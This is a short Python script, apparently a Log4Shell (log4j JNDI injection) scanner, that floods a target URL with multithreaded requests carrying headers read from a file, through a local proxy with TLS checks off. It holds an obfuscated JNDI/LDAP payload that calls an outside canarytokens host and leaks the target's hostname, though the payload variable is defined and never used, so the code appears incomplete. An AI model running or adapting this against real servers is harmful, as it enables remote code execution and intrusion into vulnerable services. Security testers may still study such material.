#!/usr/bin/env python3
import sys
import os
import requests
import concurrent.futures
import json
import urllib3

def send_requests(header):
    global url
    global proxy
    global PROXY
    header = json.loads(header)

    if 'User-Agent' not in str(header):
        header['User-Agent'] =  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"

    try:
        if PROXY:
            r = requests.get(url, headers=header, proxies=proxy, verify=False)
        else:
            r = requests.get(url, headers=header, verify=False)

    except Exception as e:
        print(e)


def start(headers):
    global THREADS
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        executor.map(send_requests, headers)


def read_file(path):
    with open(path, "r", encoding="utf8", errors="ignore") as f:
        data = f.read()

    return data[:-1].split("\n")


def main():
    global url
    global proxy
    global PROXY
    global THREADS

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    proxy = {"http" : "http://127.0.0.1:8080","https" : "http://127.0.0.1:8080"}
    PROXY = True
    THREADS = 100

    if len(sys.argv) != 3:
        print("Usage: python3 log4j.py <headers file> <url>")
        sys.exit()

    if not os.path.isfile(sys.argv[-2]):
        print("[*]Not a valid file")
        print("Usage: python3 log4j.py <headers file> <url>")
        sys.exit()

    url = sys.argv[-1]
    headers = read_file(sys.argv[-2])
    payload = "${{${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//x${hostName}.L4J.tl6jvby071gpq088dac5st2mh.canarytokens.com/a}"
    start(headers)


main()
